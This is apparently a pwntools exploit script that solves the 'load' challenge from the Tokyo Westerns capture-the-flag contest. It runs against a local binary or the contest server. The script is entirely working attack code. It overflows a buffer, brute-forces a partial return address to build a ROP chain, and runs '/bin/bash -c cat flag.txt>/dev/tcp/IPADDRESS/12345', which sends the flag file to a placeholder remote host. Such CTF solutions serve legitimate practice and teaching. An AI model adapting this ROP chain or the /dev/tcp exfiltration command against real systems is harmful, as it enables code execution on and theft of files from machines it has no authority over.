#!/usr/bin/env python
from pwn import *

# brute force 4 bits

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./load')
    else:
        s = remote('pwn1.chal.ctf.westerns.tokyo', 34835)

    elf = ELF('./load')

    name_addr = 0x601040
    readline = 0x400986
    pop_rdi = 0x400a73
    pop_rsi_r15 = 0x400a71
    ret = 0x4006a9

    payload = ''
    payload += '/proc/self/fd/0\0'
    payload += '59'.ljust(8, '\0')
    payload += p64(name_addr + 0x38)
    payload += p64(name_addr + 0x48)
    payload += p64(name_addr + 0x50)
    payload += p64(0)
    payload += '/bin/bash'.ljust(16, '\0')
    payload += '-c'.ljust(8, '\0')
    payload += 'cat flag.txt>/dev/tcp/IPADDRESS/12345'

    s.sendlineafter('name: ', payload)
    s.sendlineafter('offset: ', '0')
    s.sendlineafter('size: ', str(0x100))

    payload = ''
    payload += 'A' * 0x38
    payload += p64(pop_rdi) + p64(name_addr + 0x10)
    payload += p64(elf.symbols['atoi'])
    payload += p64(pop_rdi) + p64(name_addr + 0x38)
    payload += p64(pop_rsi_r15) + p64(name_addr + 0x18) + p64(0)
    payload += p64(ret) * 10
    payload += '\x72\x01'

    s.send(payload)
    s.stream()
